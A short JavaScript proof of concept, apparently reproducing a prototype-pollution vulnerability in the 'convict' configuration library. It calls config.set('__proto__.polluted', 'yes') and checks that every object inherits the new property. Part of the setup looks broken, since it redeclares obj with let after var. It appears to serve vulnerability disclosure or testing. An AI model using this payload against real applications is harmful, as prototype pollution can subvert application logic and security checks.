var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const convict = require('convict');
let obj = {};
const config = convict(obj);
console.log({}.polluted);
config.set('__proto__.polluted', 'yes');
console.log({}.polluted);